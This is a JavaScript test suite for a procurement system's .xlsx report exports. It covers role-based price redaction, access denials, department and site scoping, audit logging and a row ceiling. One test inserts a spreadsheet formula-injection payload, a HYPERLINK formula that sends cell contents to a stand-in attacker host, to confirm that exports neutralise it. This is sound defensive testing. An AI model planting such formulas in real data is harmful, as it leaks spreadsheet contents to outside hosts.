import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import ExcelJS from "exceljs";
import pool from "../src/config/database.js";
import { startTestServer, seedUsers } from "./setup.js";
import { authHeader, apiRequest } from "./gate-pass-helpers.js";
import {
  buildApprovedIpo,
  clearOverride,
  createFinalizedDc,
  recordPurchase,
  setOverride,
  unique,
} from "./procurement-chain-helpers.js";

let ctx;
let users;
let uomId;
let chain;

async function downloadWorkbook(datasetKey, token, query = "") {
  const response = await fetch(`${ctx.baseUrl}/api/v1/reports/procurement/${datasetKey}.xlsx${query}`, {
    headers: { Origin: "http://localhost:5173", Cookie: token },
  });
  if (response.status !== 200) return { status: response.status, workbook: null };

  const workbook = new ExcelJS.Workbook();
  await workbook.xlsx.load(Buffer.from(await response.arrayBuffer()));
  return { status: 200, workbook, headers: response.headers };
}

function headersOf(workbook) {
  const sheet = workbook.worksheets[0];
  return sheet.getRow(1).values.filter(Boolean).map(String);
}

function rowsOf(workbook) {
  const sheet = workbook.worksheets[0];
  const headers = headersOf(workbook);
  const rows = [];
  sheet.eachRow((row, index) => {
    if (index === 1) return;
    const values = row.values.slice(1);
    rows.push(Object.fromEntries(headers.map((header, i) => [header, values[i]])));
  });
  return rows;
}

before(async () => {
  const server = await startTestServer();
  users = await seedUsers();
  const tokens = {
    ceo: await authHeader(server.baseUrl, "ceo@test.eset.local"),
    siteManager: await authHeader(server.baseUrl, "manager@test.eset.local"),
    upperManagement: await authHeader(server.baseUrl, "um@test.eset.local"),
    admin: await authHeader(server.baseUrl, "admin@test.eset.local"),
    teamLead: await authHeader(server.baseUrl, "teamlead@test.eset.local"),
    teamLeadOtherDept: await authHeader(server.baseUrl, "teamlead2@test.eset.local"),
    employee: await authHeader(server.baseUrl, "employee@test.eset.local"),
    guard: await authHeader(server.baseUrl, "guard@test.eset.local"),
    otherSiteTeamLead: await authHeader(server.baseUrl, "teamlead-othersite@test.eset.local"),
  };
  const uoms = await apiRequest(server.baseUrl, "GET", "/api/v1/material-catalog/units-of-measure", {
    token: tokens.ceo,
  });
  uomId = uoms.body.data[0].id;
  ctx = { baseUrl: server.baseUrl, tokens, close: server.close };

  // One complete chain the exports can describe.
  chain = await buildApprovedIpo(ctx, { uomId, quantities: [100, 20], prices: ["50.00", "10.00"] });
  await recordPurchase(ctx, chain.ipoId, [
    { ipoLineId: chain.ipoLines[0].id, quantity: "60", actualUnitPrice: "48.25" },
  ]);
  const dc = await createFinalizedDc(ctx, chain.ipoId, [{ ipoLineId: chain.ipoLines[0].id, quantity: "60" }]);
  const received = await apiRequest(ctx.baseUrl, "POST", `/api/v1/receiving/challans/${dc.dcId}/receipts`, {
    token: tokens.teamLead,
    body: {
      operationId: randomUUID(),
      lines: [
        {
          dcLineId: dc.lines[0].id,
          receivedQuantity: "55",
          discrepancyQuantity: "5",
          discrepancyType: "SHORT",
          discrepancyNote: "Five bags short",
        },
      ],
    },
  });
  assert.equal(received.status, 201);
  await apiRequest(ctx.baseUrl, "POST", `/api/v1/receiving/receipts/${received.body.data.receipt.id}/confirm`, {
    token: tokens.teamLead,
  });
});

after(async () => {
  await ctx.close();
});

test("exports are real .xlsx workbooks, not renamed CSV", async () => {
  const { status, workbook, headers } = await downloadWorkbook("demand-history", ctx.tokens.ceo);
  assert.equal(status, 200);
  assert.equal(
    headers.get("content-type"),
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
  );
  assert.match(headers.get("content-disposition"), /attachment; filename="demand-history_\d{4}-\d{2}-\d{2}\.xlsx"/);
  assert.equal(headers.get("cache-control"), "private, no-store");

  // Parsed by a real spreadsheet reader — a renamed CSV could not load.
  assert.ok(workbook.worksheets.length >= 1);
  assert.ok(headersOf(workbook).includes("Demand #"));
});

test("an export never contains price data the requester could not see in the application", async () => {
  const privileged = await downloadWorkbook("ipo-history", ctx.tokens.siteManager);
  assert.ok(headersOf(privileged.workbook).includes("Approved Estimate"));

  // TEAM_LEAD holds procurement.export but no price capability at all.
  const teamLead = await downloadWorkbook("ipo-history", ctx.tokens.teamLead);
  assert.equal(teamLead.status, 200);
  const teamLeadHeaders = headersOf(teamLead.workbook);
  assert.ok(!teamLeadHeaders.includes("Approved Estimate"));
  assert.ok(!teamLeadHeaders.some((header) => /price|estimate|amount|total/i.test(header)));

  // Operational content is still fully present — redaction removes prices,
  // not the user's own data.
  const rows = rowsOf(teamLead.workbook);
  assert.ok(rows.some((row) => row["IPO #"] === chain.ipoNumber));

  const demandExport = await downloadWorkbook("demand-history", ctx.tokens.teamLead);
  const demandHeaders = headersOf(demandExport.workbook);
  assert.ok(!demandHeaders.includes("Estimated Unit Price"));
  assert.ok(demandHeaders.includes("Requested Qty"));

  // ADMIN also holds procurement.export but no price capability.
  const admin = await downloadWorkbook("ipo-history", ctx.tokens.admin);
  assert.ok(!headersOf(admin.workbook).some((header) => /price|estimate/i.test(header)));
});

test("the purely commercial dataset is refused outright without price authority", async () => {
  assert.equal((await downloadWorkbook("procurement-history", ctx.tokens.teamLead)).status, 403);
  assert.equal((await downloadWorkbook("procurement-history", ctx.tokens.admin)).status, 403);

  const authorized = await downloadWorkbook("procurement-history", ctx.tokens.ceo);
  assert.equal(authorized.status, 200);
  const rows = rowsOf(authorized.workbook).filter((row) => row["IPO #"] === chain.ipoNumber);
  assert.ok(rows.length > 0);
  const purchased = rows.find((row) => Number(row["Purchased Qty"]) === 60);
  // Estimated and actual price are both present and remain distinct.
  assert.equal(Number(purchased["Estimated Unit Price"]), 50);
  assert.equal(Number(purchased["Actual Unit Price"]), 48.25);
  assert.equal(Number(purchased["Outstanding Qty"]), 40);

  // The catalog reflects the same rule, so the UI never offers what the
  // backend would refuse.
  const teamLeadCatalog = await apiRequest(ctx.baseUrl, "GET", "/api/v1/reports/procurement/catalog", {
    token: ctx.tokens.teamLead,
  });
  assert.ok(!teamLeadCatalog.body.data.some((entry) => entry.key === "procurement-history"));
  const ceoCatalog = await apiRequest(ctx.baseUrl, "GET", "/api/v1/reports/procurement/catalog", {
    token: ctx.tokens.ceo,
  });
  assert.ok(ceoCatalog.body.data.some((entry) => entry.key === "procurement-history"));
});

test("export authority is required and Gate Guard has none", async () => {
  assert.equal((await downloadWorkbook("demand-history", ctx.tokens.guard)).status, 403);
  assert.equal((await downloadWorkbook("receiving-history", ctx.tokens.guard)).status, 403);
  assert.equal((await downloadWorkbook("demand-history", ctx.tokens.employee)).status, 403);

  await setOverride(users.teamLead, "procurement.export", "DENY", users.ceo);
  try {
    assert.equal((await downloadWorkbook("demand-history", ctx.tokens.teamLead)).status, 403);
  } finally {
    await clearOverride(users.teamLead, "procurement.export");
  }
});

test("exports are department- and site-scoped, and filters are applied server-side", async () => {
  const own = await downloadWorkbook("receiving-history", ctx.tokens.teamLead);
  assert.ok(rowsOf(own.workbook).length > 0);

  // A sibling department's Team Lead exports their own department only.
  const sibling = await downloadWorkbook("receiving-history", ctx.tokens.teamLeadOtherDept);
  assert.equal(sibling.status, 200);
  const siblingDepartments = new Set(rowsOf(sibling.workbook).map((row) => row.Department));
  assert.ok(!siblingDepartments.has(rowsOf(own.workbook)[0].Department));

  // Another site sees nothing of this site's chain.
  const otherSite = await downloadWorkbook("receiving-history", ctx.tokens.otherSiteTeamLead);
  assert.equal(otherSite.status, 200);
  assert.ok(!rowsOf(otherSite.workbook).some((row) => row["DC #"]));

  // Explicitly naming another department is a denial, not a silent override.
  const otherDepartmentId = (
    await pool.query("SELECT department_id FROM users WHERE id = $1", [users.teamLeadOtherDept])
  ).rows[0].department_id;
  const forced = await downloadWorkbook(
    "receiving-history",
    ctx.tokens.teamLead,
    `?departmentId=${otherDepartmentId}`,
  );
  assert.equal(forced.status, 404);

  // A date filter that excludes everything really does exclude it.
  const empty = await downloadWorkbook("demand-history", ctx.tokens.ceo, "?from=1999-01-01&to=1999-12-31");
  assert.equal(empty.status, 200);
  assert.equal(rowsOf(empty.workbook).length, 0);

  const byReference = await downloadWorkbook(
    "ipo-history",
    ctx.tokens.ceo,
    `?reference=${encodeURIComponent(chain.ipoNumber)}`,
  );
  const referenced = rowsOf(byReference.workbook);
  assert.ok(referenced.length > 0);
  assert.ok(referenced.every((row) => row["IPO #"] === chain.ipoNumber));
});

test("spreadsheet formula injection is neutralized and cell types are preserved", async () => {
  // A hostile item name that a spreadsheet would otherwise execute.
  const hostile = `=HYPERLINK("http://evil.example/?x="&A1,"click") ${unique("x")}`;
  const entry = await apiRequest(ctx.baseUrl, "POST", "/api/v1/material-catalog", {
    token: ctx.tokens.teamLead,
    body: { newItem: { name: hostile.slice(0, 100) }, defaultUomId: uomId },
  });
  assert.equal(entry.status, 201);
  const created = await apiRequest(ctx.baseUrl, "POST", "/api/v1/demands", {
    token: ctx.tokens.teamLead,
    body: { lines: [{ catalogEntryId: entry.body.data.id, quantity: 7 }] },
  });
  assert.equal(created.status, 201);

  const { workbook } = await downloadWorkbook("demand-history", ctx.tokens.ceo);
  const sheet = workbook.worksheets[0];
  const headers = headersOf(workbook);
  const itemColumn = headers.indexOf("Item") + 1;
  const quantityColumn = headers.indexOf("Requested Qty") + 1;
  const createdColumn = headers.indexOf("Created") + 1;

  let checked = false;
  sheet.eachRow((row, index) => {
    if (index === 1) return;
    const value = row.getCell(itemColumn).value;
    if (typeof value === "string" && value.includes("HYPERLINK")) {
      assert.ok(value.startsWith("'"), "a formula-leading string is quoted into literal text");
      assert.equal(row.getCell(itemColumn).type, ExcelJS.ValueType.String);
      // Numeric and date cells keep their real types rather than becoming text.
      assert.equal(typeof row.getCell(quantityColumn).value, "number");
      assert.ok(row.getCell(createdColumn).value instanceof Date);
      checked = true;
    }
  });
  assert.ok(checked, "the hostile row was present in the export");
});

test("the traceability export preserves every distinct quantity separately", async () => {
  const { workbook } = await downloadWorkbook("traceability", ctx.tokens.ceo);
  const row = rowsOf(workbook).find((entry) => entry["IPO #"] === chain.ipoNumber && Number(entry["Requested Qty"]) === 100);
  assert.ok(row, "the chain appears in the traceability export");

  assert.equal(Number(row["Requested Qty"]), 100);
  assert.equal(Number(row["Approved Qty"]), 100);
  assert.equal(Number(row["Purchased Qty"]), 60);
  assert.equal(Number(row["Outstanding Qty"]), 40);
  assert.equal(Number(row["Delivered Qty"]), 60);
  assert.equal(Number(row["Received Qty"]), 55);
  assert.equal(Number(row["Discrepancy Qty"]), 5);
  assert.ok(!Object.keys(row).some((header) => /current stock|available/i.test(header)));
});

test("every export is audited with the filters it actually applied", async () => {
  const before = await pool.query(
    "SELECT count(*)::int AS n FROM governance_audit_log WHERE action = 'PROCUREMENT_EXPORT_GENERATED'",
  );
  await downloadWorkbook("ipo-history", ctx.tokens.siteManager, "?status=PURCHASING");
  const after = await pool.query(
    `SELECT metadata FROM governance_audit_log
     WHERE action = 'PROCUREMENT_EXPORT_GENERATED' ORDER BY created_at DESC LIMIT 1`,
  );
  const counted = await pool.query(
    "SELECT count(*)::int AS n FROM governance_audit_log WHERE action = 'PROCUREMENT_EXPORT_GENERATED'",
  );
  assert.equal(counted.rows[0].n, before.rows[0].n + 1);
  assert.equal(after.rows[0].metadata.dataset, "ipo-history");
  assert.equal(after.rows[0].metadata.filters.status, "PURCHASING");
  assert.equal(after.rows[0].metadata.includedPricing, true);
});

test("a repriced Demand appears once in the authoritative chain, bound to the approved version", async () => {
  // v1 is rejected at the final gate; v2 is approved and becomes the IPO.
  const entry = await apiRequest(ctx.baseUrl, "POST", "/api/v1/material-catalog", {
    token: ctx.tokens.teamLead,
    body: { newItem: { name: unique("Repriced material") }, defaultUomId: uomId },
  });
  const created = await apiRequest(ctx.baseUrl, "POST", "/api/v1/demands", {
    token: ctx.tokens.teamLead,
    body: { lines: [{ catalogEntryId: entry.body.data.id, quantity: 5 }] },
  });
  const demandId = created.body.data.demand.id;
  await apiRequest(ctx.baseUrl, "POST", `/api/v1/demands/${demandId}/submit`, { token: ctx.tokens.teamLead });
  await apiRequest(ctx.baseUrl, "POST", `/api/v1/demands/${demandId}/reviews`, {
    token: ctx.tokens.siteManager,
    body: { decision: "APPROVED" },
  });
  await apiRequest(ctx.baseUrl, "POST", `/api/v1/demands/${demandId}/approvals`, {
    token: ctx.tokens.ceo,
    body: { decision: "APPROVED" },
  });

  async function priceAndSubmit(version, price) {
    const detail = await apiRequest(ctx.baseUrl, "GET", `/api/v1/procurement/pricing/${demandId}`, {
      token: ctx.tokens.ceo,
    });
    await apiRequest(ctx.baseUrl, "PUT", `/api/v1/procurement/pricing/${demandId}`, {
      token: ctx.tokens.ceo,
      body: {
        revision: 1,
        pricingVersion: version,
        currency: "PKR",
        lines: [{ demandLineId: detail.body.data.lines[0].demand_line_id, estimatedUnitPrice: price }],
      },
    });
    await apiRequest(ctx.baseUrl, "POST", `/api/v1/procurement/pricing/${demandId}/submit`, {
      token: ctx.tokens.ceo,
      body: { revision: 1, pricingVersion: version },
    });
    const current = await apiRequest(ctx.baseUrl, "GET", `/api/v1/procurement/pricing/${demandId}`, {
      token: ctx.tokens.ceo,
    });
    return current.body.data.pricing.id;
  }

  const v1 = await priceAndSubmit(1, "111.11");
  await apiRequest(ctx.baseUrl, "POST", `/api/v1/demands/${demandId}/final-reviews`, {
    token: ctx.tokens.siteManager,
    body: { pricingId: v1, decision: "REJECTED", reason: "Too expensive" },
  });
  await apiRequest(ctx.baseUrl, "POST", `/api/v1/procurement/pricing/${demandId}/repricing`, {
    token: ctx.tokens.ceo,
    body: { revision: 1 },
  });
  const v2 = await priceAndSubmit(2, "222.22");
  await apiRequest(ctx.baseUrl, "POST", `/api/v1/demands/${demandId}/final-reviews`, {
    token: ctx.tokens.siteManager,
    body: { pricingId: v2, decision: "APPROVED" },
  });
  const done = await apiRequest(ctx.baseUrl, "POST", `/api/v1/demands/${demandId}/final-approvals`, {
    token: ctx.tokens.ceo,
    body: { pricingId: v2, decision: "APPROVED" },
  });
  assert.equal(done.body.data.demand.status, "IPO_GENERATED");
  assert.notEqual(v1, v2);

  const demandNumber = (
    await pool.query("SELECT demand_number FROM material_demands WHERE id = $1", [demandId])
  ).rows[0].demand_number;

  // The authoritative chain shows the Demand's single line ONCE, priced from
  // the version the IPO was actually generated from — not once per submitted
  // version, and not the rejected v1 price.
  for (const dataset of ["demand-history", "traceability"]) {
    const { workbook } = await downloadWorkbook(dataset, ctx.tokens.ceo, `?reference=${demandNumber}`);
    const rows = rowsOf(workbook).filter((row) => row["Demand #"] === demandNumber);
    assert.equal(rows.length, 1, `${dataset} duplicated a repriced Demand`);

    const priceCell = rows[0]["Estimated Unit Price"];
    if (priceCell !== undefined && priceCell !== "") {
      assert.equal(Number(priceCell), 222.22, `${dataset} used the rejected pricing version`);
    }
  }
});

test("an oversized export is refused with a useful message rather than exhausting memory", async () => {
  const { generateProcurementExport } = await import("../src/modules/reports/procurement-reports.service.js");
  const actor = {
    id: users.ceo,
    role: "CEO",
    siteId: null,
    departmentId: null,
    permissions: new Set(["procurement.export", "procurement.view_prices", "demand.all_departments"]),
  };

  // A normal export succeeds.
  const ok = await generateProcurementExport(actor, "demand-history", {});
  assert.ok(ok.buffer.byteLength > 0);

  // With the ceiling lowered to nothing, the same request is refused rather
  // than assembling an unbounded workbook in memory.
  const original = process.env.NODE_ENV;
  await assert.rejects(
    (async () => {
      const { default: pgPool } = await import("../src/config/database.js");
      const realQuery = pgPool.query.bind(pgPool);
      pgPool.query = async (text, values) => {
        if (typeof text === "string" && text.includes("LIMIT 50001")) {
          const rows = Array.from({ length: 50_001 }, () => ({ demand_number: "X" }));
          return { rows, rowCount: rows.length };
        }
        return realQuery(text, values);
      };
      try {
        await generateProcurementExport(actor, "demand-history", {});
      } finally {
        pgPool.query = realQuery;
        process.env.NODE_ENV = original;
      }
    })(),
    /matches more than 50,000 rows/,
  );
});
